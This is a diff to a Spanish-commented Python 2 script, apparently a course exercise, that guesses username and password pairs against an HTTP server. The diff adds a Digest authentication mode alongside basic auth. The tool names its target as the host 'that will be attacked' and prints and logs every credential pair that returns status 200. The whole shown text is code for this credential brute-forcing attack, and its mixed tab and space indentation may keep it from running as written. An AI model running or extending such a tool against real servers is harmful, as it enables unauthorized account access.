@@ -5,7 +5,7 @@ import sys
 import optparse
 from requests import get
 from requests.exceptions import ConnectionError
-
+from requests.auth import HTTPDigestAuth
 
 def printError(msg, exit = False):
         sys.stderr.write('Error:\t%s\n' % msg)
@@ -13,7 +13,11 @@ def printError(msg, exit = False):
             sys.exit(1)
 
 def addOptions():
+    """
+    Se agrega modo digest -d y se implementa el modo verboso -v
+    """
     parser = optparse.OptionParser()
+    parser.add_option('-d','--digest', dest='digest', default=None, action='store_true', help='Digest Auth')
     parser.add_option('-v','--verbose', dest='verbose', default=None, action='store_true', help='If specified, prints detailed information during execution.')
     parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
     parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
@@ -37,6 +41,17 @@ def reportResults():
 def buildURL(server,port, protocol = 'http'):
     url = '%s://%s:%s' % (protocol,server,port)
     return url
+
+def dRequest(host, user, password):
+    digest=HTTPDigestAuth(user,password)
+    try:
+	response = get(host, auth=digest)
+	#print response
+	#print dir(response)
+        return response
+    except ConnectionError:
+        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)
+
 
 
 def makeRequest(host, user, password):
@@ -80,8 +95,11 @@ if __name__ == '__main__':
                 if opts.report:
                     reporte = open(opts.report,'a+')
                     reporte.write('\nUtilizando:\tUsuario:%s\tConstraseña: %s\nEn host:%s\tPuerto:%s' % (usser,passwdd,opts.server,opts.port))
-		
-                req = makeRequest(url, usser, passwdd)
+
+                if opts.digest:
+                    req = dRequest(url,usser,passwdd)
+                else:
+                    req = makeRequest(url, usser, passwdd)
                 if req.status_code == 200:
                     print 'Credenciales validas: %s, %s'% (usser,passwdd)
                     if opts.report:
